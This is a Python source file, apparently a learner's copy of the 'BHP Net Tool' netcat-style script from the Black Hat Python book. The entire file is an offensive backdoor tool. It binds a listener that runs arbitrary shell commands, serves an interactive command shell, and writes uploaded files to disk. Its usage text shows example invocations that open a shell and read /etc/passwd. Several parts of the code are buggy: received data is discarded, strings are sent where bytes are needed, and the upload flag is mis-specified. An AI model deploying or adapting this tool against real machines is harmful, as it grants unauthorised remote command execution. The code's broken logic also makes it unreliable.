import sys
import socket
import getopt
import threading
import subprocess
# That takes care of the imports for functions 
# now to define some global varibles. 
listen          =False
command         =False
upload          =False
execute         =""
target          =""
upload_destination = ""
port            = 0
# Global variables set and we are ready for the rest of the program.
# Now our main function that is going to handle line arguments and calling our functions
def usage():
    print("BHP Net Tool \n")
    print("\n Usage: bhpnet.py -t target_host -p port ")
    print("\n -l --listen                 - listen on [host]:[port] for incomming connections")
    print("\n -e --execute=file_to_run - execute the given file upon recieving a connection")
    print("-c --command  -initialize a command shell!!")
    print("-u --upload=desitnation  -upon recieving connection upload a file and write to [desitnation]")
    print("-t --target   is the target you are setting as the target ip")
    print()
    print("Examples: ")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\cat /etc/passwd")
    print("echo abcdefg | ./bhpnet.py -t 192.168.0.1 -p 135")
    sys.exit(0)
def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # connect to our target host
        client.connect((target,port))
        if len(buffer):
            client.send(buffer)
        while True:
            # now wait for data to come back
            recv_len = 1
            response = ""
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                if recv_len < 4096:
                    break
            print(response)
            # wait for more input
            buffer = input("")
            buffer += "\n"
            client.send(buffer)
    except:
        print("[*] Exception! Exiting.")
        client.close()
def server_loop():
    global target
    
    #if not target is defined we listen on all interfaces
    if not len(target):
        target = "0.0.0.0"
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target,port))
    server.listen(5)
    while True:
        client_socket, addr = server.accept()
        #spin off a thread to handle our new client
        client_thread = threading.Thread(target=client_handler,args=(client_socket,))
        client_thread.start()
def run_command(command):
    #trim the new line
    command = command.rstrip()
    #run the command and get the output back
    try:
        output = subprocess.check_output(command,stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command. \r\n"
    #send output back to the client
    return output
def client_handler(client_socket):
    global upload
    global execute
    global command
    
    #check for upload
    if len(upload_destination):
        #read in all of the bytes and write to our destination
        file_buffer = ""
        #keep reading data until nonw is available
        while True:
            data = client_socket.recv(1024)
            if not data:
                break
            else:
                file_buffer += data
        #now we take the bytes and try to write them out. 
        try:
            file_descriptor = open(upload_destination,"wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            # confirm we wrote the file out
            client_socket.send("Sucessfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to write file to %s\r\n" % upload_destination)
    #check for command execution
    if len(execute):
            output = run_command(execute)
            client_socket.send(output)
    #now another loop for if a command shell was requested
    if command:
        while True:
            #show a simple prompt
            client_socket.send("<BHP:#> ")
            #now we receive until we see a linefeed
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
                response = run_command(cmd_buffer)
                client_socket.send(response)
def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
    
    if not len(sys.argv[1:]):
        usage()
    try:
        opts, args = getopt.getopt(sys.argv[1:],"hle:t:p:cu", ["help","listen","execute","target","port","command","upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()
    for o,a in opts:
        if o in ("-h","--help"):
            usage()
        elif o in ("-l","--listen"):
            listen=True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command=True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False,"Unhandled Option"
    if not listen and len(target) and port > 0:
        #read in the buffer from the command line
        # you can ctrl-D if not sending input
        buffer = sys.stdin.read()
        #send data
        client_sender(buffer)
    if listen:
        server_loop()
main()
            
         